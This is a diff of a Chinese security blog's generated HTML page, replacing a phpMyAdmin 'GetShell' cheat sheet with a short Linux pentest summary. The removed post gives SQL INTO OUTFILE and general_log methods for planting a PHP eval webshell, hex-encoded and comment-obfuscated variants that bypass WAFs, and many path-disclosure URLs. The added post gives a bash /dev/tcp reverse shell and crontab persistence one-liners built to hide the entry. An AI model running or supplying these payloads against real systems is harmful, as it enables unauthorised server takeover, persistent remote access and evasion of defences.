@@ -4,9 +4,12 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="学习总结篇—GetShell, dylan&#39;s blog">
-    <meta name="description" content="0x00 前言各种GetShell总结
-0x01 phpMyAdmin GetShell网站路径信息获取找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，而Document Roo">
+    <meta name="keywords" content="学习总结篇—Linux, dylan&#39;s blog">
+    <meta name="description" content="前言 Linux渗透测试总结
+bash`bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1`
+
+`bash -i`                   #交互的 shell 
+`&amp;amp">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +17,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>学习总结篇—GetShell | dylan&#39;s blog</title>
+    <title>学习总结篇—Linux | dylan&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -274,13 +277,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        学习总结篇—GetShell
+                        学习总结篇—Linux
                     </div>
                 </div>
             </div>
@@ -391,8 +394,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/GetShell/" target="_blank">
-                                <span class="chip bg-color">GetShell</span>
+                            <a href="/tags/Linux/" target="_blank">
+                                <span class="chip bg-color">Linux</span>
                             </a>
                         
                             <a href="/tags/summary/" target="_blank">
@@ -419,21 +422,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-11-20
+                    2019-08-27
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.8k
+                        173
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        12 分
+                        1 分
                     </div>
                     
                 
@@ -449,198 +452,14 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>各种GetShell总结</p>
-<h1 id="0x01-phpMyAdmin-GetShell"><a href="#0x01-phpMyAdmin-GetShell" class="headerlink" title="0x01 phpMyAdmin GetShell"></a>0x01 phpMyAdmin GetShell</h1><h2 id="网站路径信息获取"><a href="#网站路径信息获取" class="headerlink" title="网站路径信息获取"></a>网站路径信息获取</h2><p>找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，<br>而Document Root最常见的地方就是 phpinfo.php页面和httpd.conf配置文件中；</p>
-<h3 id="phpinfo获取网站路径"><a href="#phpinfo获取网站路径" class="headerlink" title="phpinfo获取网站路径"></a>phpinfo获取网站路径</h3><h4 id="收集网站部署使用的套件信息"><a href="#收集网站部署使用的套件信息" class="headerlink" title="收集网站部署使用的套件信息"></a>收集网站部署使用的套件信息</h4><p>常见未删除phpinfo页面</p>
-<ul>
-<li>phpinfo.php</li>
-<li>info.php</li>
-<li>1.php</li>
-<li>test.php</li>
-</ul>
-<p>常见未删除探针页面</p>
-<ul>
-<li>l.php</li>
-<li>p.php</li>
-<li>tanzhen.php</li>
-<li>tz.php</li>
-<li>u.php</li>
-</ul>
-<p>常见未删除测试文件</p>
-<ul>
-<li>test.php</li>
-<li>ceshi.php</li>
-<li>info.php</li>
-<li>phpinfo.php</li>
-<li>php_info.php</li>
-<li>1.php</li>
-</ul>
-<h4 id="爬行遍历收集"><a href="#爬行遍历收集" class="headerlink" title="爬行遍历收集"></a>爬行遍历收集</h4><p>通过web扫描器，进行爬虫爬行遍历网站的所有链接，<br>收集可能存在的phpinfo类似的页面，收集网站物理路径信息。</p>
-<h4 id="爆破扫描收集"><a href="#爆破扫描收集" class="headerlink" title="爆破扫描收集"></a>爆破扫描收集</h4><p>通过web扫描器，进行爬虫爬行遍历网站的所有链接，<br>收集可能存在的phpinfo类似的页面，收集网站物理路径信息。</p>
-<h3 id="Google语法爆路径"><a href="#Google语法爆路径" class="headerlink" title="Google语法爆路径"></a>Google语法爆路径</h3><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。<br>注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p>
-<pre><code>Site:xxx.edu.tw warning
-Site:xxx.com.tw “fatal error”</code></pre><h3 id="配置文件读取网站路径"><a href="#配置文件读取网站路径" class="headerlink" title="配置文件读取网站路径"></a>配置文件读取网站路径</h3><p>关键字：<strong>web套件配置文件默认路径</strong></p>
-<p> <code>load_file()</code>函数读取配置文件<br><strong>读取配置文件httpd.conf 或vhosts.conf！！！</strong></p>
-<p>通过常用的web容器套件，来获取默认的网站可写路径信息，<br>如常用套件：xampp、phpnow、phpstudy等。</p>
-<h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>在通过web套件已经猜解到网站的默认路径后，经常会遇到向套件默认目录写入一句话后，无法成功的情况。</p>
-<ul>
-<li><p>情况一：<br>一句话写入成功，但是此目录并不是渗透对象的网站根目录，<br>我们无法通过URL地址访问到“我们写入的一句话木马”；</p>
-</li>
-<li><p>情况二：<br>还有一种情况，就是对于套件默认路径，我们没有写入的权限。<br>最常见的案例就是，我们渗透的网站服务器的系统是linux主机，而没有写入权限。</p>
-</li>
-</ul>
-<ul>
-<li>情况三：<br>再有一种情况就是，目标站点有相应的安全防护如杀毒软件、安全狗、或者IPS、WAF一类的应用防护，<br>导致无法成功写入一句话。对于这种有应用防护的原理，基本一致，都是基于特征检测的方式进行安全防护，<br>如单一特征、多特征防护。那么绕过这些安全防护的方法就是使用变种，如对提交内容进行编码混淆或者采用非敏感的函数等，<br>关于木马绕过技术不在文中扩展说明。</li>
-</ul>
-<p>对于以上“情况一”与“情况二”不能写入成功问题的解决思路，需要满足以下两个条件即可完美解决。</p>
-<p><strong>找到可写的网站路径</strong><br><strong>且可写路径为渗透站点的物理路径，能够被正常的URL访问解析`</strong></p>
-<p>而对于要满足以上的条件，最好的办法，就是通过读取web套件中间件的配置文件信息，获取网站的真实物理路径（如：httpd.conf）。<br>如在获知目标站点使用的xampp套件的情况，下我们可以直接利用phpmyadmin有root登录权限的条件下，<br>直接读取默认配置文件httpd.conf，通过配置文件httpd.conf收集到网站的真实物理路径，<br>读取方法：</p>
-<p><code>select load_file(&#39;D:/xampp/apache/conf/httpd.conf&#39;);</code></p>
-<p>查看数据库目录<br><code>Select @@basedir</code><br>或者<br><code>select @@basedir</code></p>
-<h4 id="Xampp套件"><a href="#Xampp套件" class="headerlink" title="Xampp套件"></a>Xampp套件</h4><p>网站默认路径：<br><code>$disk:/xampp/htdocs</code></p>
-<p>其他可写入路径：<br><code>$disk:/xampp/phpmyadmin/</code><br><strong>注：xampp套件phpmyadmin目录如果没删除，也可以尝试直接写入操作；</strong></p>
-<p>猜测默认apache默认配置文件路径，读取配置文件，查找网站根目录和可写目录路径；<br>Apache配置文件默认路径：</p>
-<p>httpd.conf配置文件：<code>$disk:/xampp/apache/conf/httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:/xampp/apache/conf/extra/httpd-vhosts.conf</code></p>
-<h4 id="LAMPP套件"><a href="#LAMPP套件" class="headerlink" title="LAMPP套件"></a>LAMPP套件</h4><p>网站默认路径：<br><code>/opt/lampp/htdocs</code></p>
-<p>Apache配置文件默认路径：<br>httpd.conf配置文件：<code>/opt/lampp/etc/httpd.conf</code><br>vhosts.conf虚拟主机：<code>/opt/lampp/etc/extra/httpd-vhosts.conf</code></p>
-<h4 id="phpStudy套件"><a href="#phpStudy套件" class="headerlink" title="phpStudy套件"></a>phpStudy套件</h4><p>网站默认路径:</p>
-<p><code>$disk:/phpstudy/www</code></p>
-<p>Apache配置文件默认路径：</p>
-<p>httpd.conf配置文件：<code>$disk:/phpStudy/Apache/conf/httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:/phpStudy/Apache/conf/extra/httpd-vhosts.conf</code></p>
-<h4 id="phpnow套件"><a href="#phpnow套件" class="headerlink" title="phpnow套件"></a>phpnow套件</h4><p>phpnow套件默认网站路径依据版本不同可能不同，<br>当前使用最新的版本是1.5.6，其默认目录：</p>
-<p><code>$disk:\phpnow-1.5.6\htdocs</code></p>
-<p>Apache配置文件默认路径：</p>
-<p>httpd.conf配置文件：<code>$disk:\PHPnow-1.5.6\Apache-20\conf\httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:\PHPnow-1.5.6\Apache-20\conf\extra\vhosts.comf</code></p>
-<h4 id="LNMP套件"><a href="#LNMP套件" class="headerlink" title="LNMP套件"></a>LNMP套件</h4><p>网站默认路径：</p>
-<p><code>/home/wwwroot/default</code></p>
-<h4 id="其他Web容器"><a href="#其他Web容器" class="headerlink" title="其他Web容器"></a>其他Web容器</h4><p>IIS6.0+win2003 配置文件<br>网站默认路径：<code>$disk:\InetPub\wwwroot</code><br>配置文件默认路径：<code>C:/Windows/system32/inetsrv/metabase.xml</code></p>
-<p>IIS7.0+WINDOWS配置文件<br>网站默认路径：<code>$disk:\InetPub\wwwroot</code><br>配置文件默认路径：<code>C:\Windows\System32\inetsrv\config\applicationHost.config</code></p>
-<p>Linux:</p>
-<p>配置文件:<br><code>/etc/php.ini php</code><br><code>/etc/httpd/conf.d/php.conf</code><br>配置文件:<br><code>/etc/httpd/conf/httpd.conf Apache</code><br><code>/usr/local/apache/conf/httpd.conf</code><br><code>/usr/local/apache2/conf/httpd.conf</code><br>虚拟目录配置文件:<br><code>/usr/local/apache/conf/extra/httpd-vhosts.conf</code></p>
-<h3 id="错误页面爆网站路径"><a href="#错误页面爆网站路径" class="headerlink" title="错误页面爆网站路径"></a>错误页面爆网站路径</h3><p>特定目录报错！！！</p>
-<h4 id="Phpmyadmin暴路径"><a href="#Phpmyadmin暴路径" class="headerlink" title="Phpmyadmin暴路径"></a>Phpmyadmin暴路径</h4><p>一般在获取phpmyadmin管理页面后，特定的版本访问特点的目录，可以爆出网站的物理路径。</p>
-<ol>
-<li><code>/phpmyadmin/libraries/lect_lang.lib.php</code></li>
-<li><code>/phpMyAdmin/index.php?lang[]=1</code></li>
-<li><code>/phpMyAdmin/phpinfo.php</code></li>
-<li><code>/phpmyadmin/themes/darkblue_orange/layout.inc.php</code></li>
-<li><code>/phpmyadmin/libraries/select_lang.lib.php</code></li>
-<li><code>/phpmyadmin/libraries/lect_lang.lib.php</code></li>
-<li><code>/phpmyadmin/libraries/mcrypt.lib.php</code></li>
-</ol>
-<h4 id="SQL注入点暴路径"><a href="#SQL注入点暴路径" class="headerlink" title="SQL注入点暴路径"></a>SQL注入点暴路径</h4><p>对于存在sql注入点的页面，可以尝试“加单引号”或者“构造错误参数”进行网站路径爆错显示。</p>
-<p><code>www.xxx.com/news.php?id=149′</code><br><code>www.xxx.com/researcharchive.php?id=-1</code></p>
-<h4 id="nginx文件类型错误解析爆路径"><a href="#nginx文件类型错误解析爆路径" class="headerlink" title="nginx文件类型错误解析爆路径"></a>nginx文件类型错误解析爆路径</h4><p>当我们遇到Web服务器是nginx，且存在文件类型解析漏洞时，可以在图片地址后加<code>/x.php</code>，<br>该图片不但会被当作<code>php</code>文件执行，还有可能爆出物理路径。</p>
-<p><code>www.xyz.com/123.jpg/x.php</code></p>
-<h4 id="DeDeCms"><a href="#DeDeCms" class="headerlink" title="DeDeCms"></a>DeDeCms</h4><pre><code>/member/templets/menulit.php
-/plus/paycenter/alipay/return_url.php
-/plus/paycenter/cbpayment/autoreceive.php
-/paycenter/nps/config_pay_nps.php
-/plus/task/dede-maketimehtml.php
-/plus/task/dede-optimize-table.php
-/plus/task/dede-upcache.php</code></pre><h4 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h4><pre><code>/wp-admin/includes/file.php
-/wp-content/themes/baiaogu-seo/footer.php</code></pre><h4 id="Ecshop商城系统暴路径漏洞文件"><a href="#Ecshop商城系统暴路径漏洞文件" class="headerlink" title="Ecshop商城系统暴路径漏洞文件"></a>Ecshop商城系统暴路径漏洞文件</h4><pre><code>/api/cron.php
-/wap/goods.php
-/temp/compiled/ur_here.lbi.php
-/temp/compiled/pages.lbi.php
-/temp/compiled/user_transaction.dwt.php
-/temp/compiled/history.lbi.php
-/temp/compiled/page_footer.lbi.php
-/temp/compiled/goods.dwt.php
-/temp/compiled/user_clips.dwt.php
-/temp/compiled/goods_article.lbi.php
-/temp/compiled/comments_list.lbi.php
-/temp/compiled/recommend_promotion.lbi.php
-/temp/compiled/search.dwt.php
-/temp/compiled/category_tree.lbi.php
-/temp/compiled/user_passport.dwt.php
-/temp/compiled/promotion_info.lbi.php
-/temp/compiled/user_menu.lbi.php
-/temp/compiled/message.dwt.php
-/temp/compiled/admin/pagefooter.htm.php
-/temp/compiled/admin/page.htm.php
-/temp/compiled/admin/start.htm.php
-/temp/compiled/admin/goods_search.htm.php
-/temp/compiled/admin/index.htm.php
-/temp/compiled/admin/order_list.htm.php
-/temp/compiled/admin/menu.htm.php
-/temp/compiled/admin/login.htm.php
-/temp/compiled/admin/message.htm.php
-/temp/compiled/admin/goods_list.htm.php
-/temp/compiled/admin/pageheader.htm.php
-/temp/compiled/admin/top.htm.php
-/temp/compiled/top10.lbi.php
-/temp/compiled/member_info.lbi.php
-/temp/compiled/bought_goods.lbi.php
-/temp/compiled/goods_related.lbi.php
-/temp/compiled/page_header.lbi.php
-/temp/compiled/goods_script.html.php
-/temp/compiled/index.dwt.php
-/temp/compiled/goods_fittings.lbi.php
-/temp/compiled/myship.dwt.php
-/temp/compiled/brands.lbi.php
-/temp/compiled/help.lbi.php
-/temp/compiled/goods_gallery.lbi.php
-/temp/compiled/comments.lbi.php
-/temp/compiled/myship.lbi.php
-/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php
-/includes/modules/cron/auto_manage.php
-/includes/modules/cron/ipdel.php</code></pre><h4 id="Ucenter爆路径"><a href="#Ucenter爆路径" class="headerlink" title="Ucenter爆路径"></a>Ucenter爆路径</h4><p><code>/ucenter/control/admin/db.php</code></p>
-<h4 id="DZbbs"><a href="#DZbbs" class="headerlink" title="DZbbs"></a>DZbbs</h4><p><code>/manyou/admincp.php?my_suffix=%0A%0DTOBY57</code></p>
-<h4 id="Z-blog"><a href="#Z-blog" class="headerlink" title="Z-blog"></a>Z-blog</h4><p><code>/admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php</code></p>
-<h4 id="Php168爆路径"><a href="#Php168爆路径" class="headerlink" title="Php168爆路径"></a>Php168爆路径</h4><pre><code>/admin/inc/hack/count.php?job=list
-/admin/inc/hack/search.php?job=getcode
-/admin/inc/ajax/bencandy.php?job=do
-/cache/MysqlTime.txt</code></pre><p>PHPcms2008-sp4<br>注册用户登陆后访问<br><code>/phpcms/corpandresize/process.php?pic=../images/logo.gif</code></p>
-<h4 id="CMSeasy爆网站路径漏洞"><a href="#CMSeasy爆网站路径漏洞" class="headerlink" title="CMSeasy爆网站路径漏洞"></a>CMSeasy爆网站路径漏洞</h4><p>漏洞出现在menu_top.php这个文件中</p>
-<pre><code>/lib/mods/celive/menu_top.php
-/lib/default/ballot_act.php
-/lib/default/special_act.php</code></pre><h2 id="写入shell方法"><a href="#写入shell方法" class="headerlink" title="写入shell方法"></a>写入shell方法</h2><h3 id="写入条件"><a href="#写入条件" class="headerlink" title="写入条件"></a>写入条件</h3><p><strong>导出WebShell主要条件：</strong></p>
-<ul>
-<li>Root数据库用户（root权限）</li>
-<li>网站绝对路径（确定有写入权限）</li>
-<li>magic_quotes_gpc：Off（关闭）</li>
-</ul>
-<p><strong>导出WebShell其它条件：</strong></p>
-<ul>
-<li>magic_quotes_gpc：开启时，会对’单引号进行转义，使其变成“\”反斜杠。</li>
-<li>secure_file_priv：此配置项用来完成对数据导入导出的限制，如允许导入导出到指定目录。</li>
-<li>file_priv：file_priv权限允许你用load_file、into outfile读和写服务器上的文件，任何被授予这个权限的用户都能读和写服务器的任何文件。</li>
-</ul>
-<p><strong>写入权限</strong><br>查看能否自定义导出文件目录的权限</p>
-<p><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/1541693041317.png" alt></p>
-<p>如果值为文件夹目录，则只允许修改目录下的文件，如果值为<code>NULL</code>则为禁止。<br>并且这个值是只读变量，只能通过配置文件修改。</p>
-<pre><code>show global variables like &quot;%secure%&quot;;      //查询secure_file_priv配置
-secure_file_prive=null              //不允许导入导出数据到目录
-secure_file_priv=c:\90sec            //允许导入导出数据到指定目录
-secure_file_priv=&#39;&#39;              //允许导入导出数据到任意目录
-secure_file_priv=&quot;/&quot;              //允许导入导出数据到任意目录</code></pre><p>注：<br>在<code>my.ini</code>、<code>my.cnf</code>、<code>mysqld.cnf</code>文件中找到<code>secure_file_prive</code><br>并将其值设置为<code>&quot;&quot;</code>或<code>&quot;/&quot;</code>，重启MySQL服务！</p>
-<h3 id="常规方法"><a href="#常规方法" class="headerlink" title="常规方法"></a>常规方法</h3><p><strong>创建数据表导出shell</strong></p>
-<pre><code>CREATE TABLE `mysql`.`shadow9` (`content` TEXT NOT NULL );
-INSERT INTO `mysql`.`shadow9` (`content` ) VALUES (&#39;&lt;?php @eval($_POST[pass]);?&gt;&#39;);
-SELECT `content` FROM `shadow9` INTO OUTFILE &#39;C:\\phpStudy\\WWW\\90sec.php&#39;;
-DROP TABLE IF EXISTS `shadow9`;</code></pre><p> <strong>一句话导出shell</strong></p>
-<pre><code>select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;c:/phpstudy/www/90sec.php&#39;;  
-select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;c:\\phpstudy\\www\\90sec.php&#39;;
-select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into dumpfile &#39;c:\\phpstudy\\www\\bypass.php&#39;;</code></pre><p><strong>日志备份获取shell</strong></p>
-<pre><code>show global variables like &quot;%genera%&quot;;          //查询general_log配置
-set global general_log=&#39;on&#39;;              //开启general log模式
-SET global general_log_file=&#39;D:/phpStudy/WWW/cmd.php&#39;;    //设置日志文件保存路径
-SELECT &#39;&lt;?php phpinfo();?&gt;&#39;;              //phpinfo()写入日志文件
-set global general_log=&#39;off&#39;;              //关闭general_log模式</code></pre><h3 id="绕过写入"><a href="#绕过写入" class="headerlink" title="绕过写入"></a>绕过写入</h3><p>当有WAF拦截的时候 我们可以尝试外链 这样提交的数据包不被WAF拦截<br><code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;root&#39; with grant option;     //开启MySQL外链</code><br><code>flush privileges;                      //刷新MySQL系统权限相关表</code></p>
-<p>这里的这些技巧是从别人那边收集过来的 感谢！！！<br>绕过360 （通过内联注释）<br><code>select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into /*!50001outfile*/ &#39;c:/phpstudy/www/bypass.php&#39;;</code></p>
-<p>绕过网站安全狗&lt;4.0 （通过hex编码）</p>
-<pre><code>select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>绕过安全狗4.0 通过hex编码+内联注释</p>
-<pre><code>/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h3 id="绕过写入-1"><a href="#绕过写入-1" class="headerlink" title="绕过写入"></a>绕过写入</h3><p>绕过server_sql.php、tbl_sql.php、db_sql.php + 安全狗导出WebShell<br>以上的三个文件的作用是（执行SQL语句）<br>但是如果被删除了可以通过以下的方法</p>
-<ul>
-<li>token需要</li>
-<li>自己选择一个数据库和数据表</li>
-<li>参数pos=0</li>
-</ul>
-<pre><code>&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>例如</p>
-<pre><code>http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&amp;token=token值&amp;table=数据表名&amp;pos=0&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h1 id="CMS-GetShell"><a href="#CMS-GetShell" class="headerlink" title="CMS GetShell"></a>CMS GetShell</h1><h2 id="WordPress-1"><a href="#WordPress-1" class="headerlink" title="WordPress"></a>WordPress</h2><p><a href="https://dylan903.coding.me/2019/11/06/wordpress-hou-tai-getshell-zong-jie/">Wordpress 后台GetShell总结</a></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://bbs.ichunqiu.com/thread-19893-1-1.html" target="_blank" rel="noopener">PhpMyAdmin 网站路径信息获取</a><br><a href="https://blog.csdn.net/q1352483315/article/details/88904001" target="_blank" rel="noopener">总结下写phpmyadmin写shell的方法</a><br><a href="https://xz.aliyun.com/t/3283" target="_blank" rel="noopener">phpmyadmin getshell姿势 - 先知社区</a></p>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> Linux渗透测试总结</p>
+<h1 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h1><pre><code>`bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1`
+
+`bash -i`                   #交互的 shell 
+`&amp;`                         #标准错误输出到标准输出
+`/dev/tcp/10.0.0.1/8080`    #建立 socket ip port
+`0&gt;&amp;1`                      #标准输入到标准输出</code></pre><pre><code>(crontab -l;echo &#39;*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/port;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#39;)|crontab -</code></pre><h2 id="猥琐版"><a href="#猥琐版" class="headerlink" title="猥琐版"></a>猥琐版</h2><pre><code>(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/PORT;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n&quot;)|crontab -</code></pre><p>详细介绍：<br><a href="https://github.com/dylan903/security_circle_2017/blob/master/15288418585142.md" target="_blank" rel="noopener">https://github.com/dylan903/security_circle_2017/blob/master/15288418585142.md</a></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_33020901/article/details/80547964" target="_blank" rel="noopener">史上最强内网渗透知识点总结</a></p>
 
             </div>
             <hr/>
@@ -799,9 +618,9 @@ set global general_log=&#39;off&#39;;              //关闭general_log模式</co
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《学习总结篇—GetShell》
+                    《学习总结篇—Linux》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/20/xue-xi-zong-jie-pian-getshell/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/27/xue-xi-zong-jie-pian-linux/" property="cc:attributionName"
                rel="cc:attributionURL">
                 dylan
             </a> 采用
@@ -1104,24 +923,24 @@ set global general_log=&#39;off&#39;;              //关闭general_log模式</co
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/11/20/xue-xi-zong-jie-pian-lou-dong-li-yong/">
+                <a href="/2019/08/28/xue-xi-zong-jie-pian-getshell/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="学习总结篇—漏洞利用">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="学习总结篇—GetShell">
                         
-                        <span class="card-title">学习总结篇—漏洞利用</span>
+                        <span class="card-title">学习总结篇—GetShell</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            学习总结篇—漏洞利用
+                            学习总结篇—GetShell
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-20
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-28
                         </span>
                         <span class="publish-author">
                             
@@ -1138,12 +957,12 @@ set global general_log=&#39;off&#39;;              //关闭general_log模式</co
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/summary/" target="_blank">
-                        <span class="chip bg-color">summary</span>
+                    <a href="/tags/GetShell/" target="_blank">
+                        <span class="chip bg-color">GetShell</span>
                     </a>
                     
-                    <a href="/tags/漏洞利用/" target="_blank">
-                        <span class="chip bg-color">漏洞利用</span>
+                    <a href="/tags/summary/" target="_blank">
+                        <span class="chip bg-color">summary</span>
                     </a>
                     
                 </div>
@@ -1157,24 +976,24 @@ set global general_log=&#39;off&#39;;              //关闭general_log模式</co
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/20/xue-xi-zong-jie-pian-linux/">
+                <a href="/2019/08/26/xue-xi-zong-jie-pian-windows/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="学习总结篇—Linux">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="学习总结篇—Windows">
                         
-                        <span class="card-title">学习总结篇—Linux</span>
+                        <span class="card-title">学习总结篇—Windows</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            学习总结篇—Linux
+                            学习总结篇—Windows
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-20
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-26
                             </span>
                         <span class="publish-author">
                             
@@ -1191,12 +1010,12 @@ set global general_log=&#39;off&#39;;              //关闭general_log模式</co
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Linux/" target="_blank">
-                        <span class="chip bg-color">Linux</span>
-                    </a>
-                    
                     <a href="/tags/summary/" target="_blank">
                         <span class="chip bg-color">summary</span>
+                    </a>
+                    
+                    <a href="/tags/Windows/" target="_blank">
+                        <span class="chip bg-color">Windows</span>
                     </a>
                     
                 </div>
